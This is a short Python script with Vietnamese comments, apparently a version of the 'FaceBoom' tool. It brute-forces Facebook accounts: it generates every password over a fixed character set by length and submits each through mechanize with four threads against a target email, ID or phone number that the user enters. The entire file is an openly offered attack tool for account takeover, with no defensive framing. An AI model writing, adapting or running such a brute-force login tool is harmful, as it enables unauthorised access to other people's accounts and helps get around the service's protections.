import itertools
import mechanize
import threading
import queue

# Các ký tự để thử trong mật khẩu
characters = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890.?!@"

# Queue để chứa mật khẩu và kết quả
password_queue = queue.Queue()
result_queue = queue.Queue()

class FaceBoom(object):
    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders = [('User-agent', 'Mozilla/5.0')]

    def login(self, target, password):
        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email'] = target
            self.br.form['pass'] = password
            self.br.method = "POST"
            response = self.br.submit()
            if response.get_data().__contains__(b'home_icon'):
                return 1
            elif "checkpoint" in self.br.geturl():
                return 2
            return 0
        except Exception as e:
            print(f"Error: {str(e)}")
            return -1

def password_generator():
    length = 1
    while True:
        for password in itertools.product(characters, repeat=length):
            password_queue.put(''.join(password))
        length += 1

def worker(target):
    faceboom = FaceBoom()
    while True:
        password = password_queue.get()
        if password is None:
            break
        print(f"Trying password: {password}")
        result = faceboom.login(target, password)
        if result == 1:
            result_queue.put(password)
            break
        elif result == 2:
            result_queue.put(f"Account locked with 2-factor authentication. Password was: {password}")
            break
        password_queue.task_done()

def Main(target):
    num_threads = 4  # Số lượng luồng bạn muốn sử dụng

    # Tạo luồng để thử mật khẩu
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(target,))
        t.start()
        threads.append(t)

    # Tạo luồng sinh mật khẩu
    pw_gen_thread = threading.Thread(target=password_generator)
    pw_gen_thread.start()

    # Đợi các luồng hoàn thành
    password_queue.join()
    pw_gen_thread.join()
    
    for _ in range(num_threads):
        password_queue.put(None)
    for t in threads:
        t.join()

    # Xử lý kết quả
    while not result_queue.empty():
        result = result_queue.get()
        print(result)

if __name__ == "__main__":
    target = input("Enter the target's email, ID, or phone number: ")
    Main(target)